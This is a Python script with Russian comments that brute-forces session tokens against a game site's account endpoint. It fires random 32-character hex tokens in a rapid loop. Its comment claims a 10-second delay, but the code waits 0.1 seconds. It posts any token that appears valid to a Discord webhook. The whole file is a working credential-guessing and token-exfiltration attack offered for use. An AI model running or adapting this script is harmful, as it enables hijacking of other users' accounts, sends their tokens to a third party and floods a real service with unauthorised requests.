import json
import os
import secrets
import time
import requests

URL = "https://session.coolmathblox.ca/accounts/set_cosmetic"

DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")
TARGET_RESPONSE_VALUE = "G"


def generate_random_auth():
    # Генерирует 32-значную hex-строку (буквы a-f, цифры 0-9)
    return secrets.token_hex(16)


def send_discord_notification(auth_token):
    if not DISCORD_WEBHOOK:
        print("⚠️ Предупреждение: DISCORD_WEBHOOK не настроен!")
        return

    payload = {
        "content": f"@everyone Найден токен! Вот токен: `{auth_token}`",
        "allowed_mentions": {"parse": ["everyone"]},
    }

    try:
        res = requests.post(
            DISCORD_WEBHOOK,
            json=payload,
            headers={"Content-Type": "application/json"},
        )
        if res.status_code in (200, 204):
            print("📣 Уведомление успешно отправлено в Discord.")
        else:
            print(
                f"❌ Ошибка отправки в Discord ({res.status_code}): {res.text}"
            )
    except Exception as e:
        print(f"❌ Ошибка при отправке на Webhook: {e}")


print("🤖 Скрипт запущен с выводом токенов в консоль...")

while True:
    # Генерируем 32-значный токен
    random_auth = generate_random_auth()

    # Выводим сгенерированный токен в консоль перед отправкой
    print(f"🔑 Отправляемый токен: {random_auth}")

    headers = {
        "Content-Type": "application/json",
        "authorization": random_auth,
    }

    body = {"type": "skin", "id": "remlin"}

    try:
        response = requests.post(URL, json=body, headers=headers)

        try:
            data = response.json()
            print(f"✅ Response:", data)

            if isinstance(data, dict) and data.get("purchased") is False:
                print(
                    f"⚠️ Обнаружен purchased: False! Отправка токена {random_auth} в Discord..."
                )
                send_discord_notification(random_auth)

            elif data == TARGET_RESPONSE_VALUE:
                print(
                    f"ℹ️ Получен целевой ответ ({TARGET_RESPONSE_VALUE}), продолжаем..."
                )

        except json.JSONDecodeError:
            raw_text = response.text.strip()
            print(f"✅ Response (Raw Text): {raw_text}")

            if raw_text == TARGET_RESPONSE_VALUE:
                print(
                    f"ℹ️ Получен целевой ответ ({TARGET_RESPONSE_VALUE}), продолжаем..."
                )

    except Exception as err:
        print(f"❌ Error:", err)

    # Задержка 10 секунд
    time.sleep(0.1)
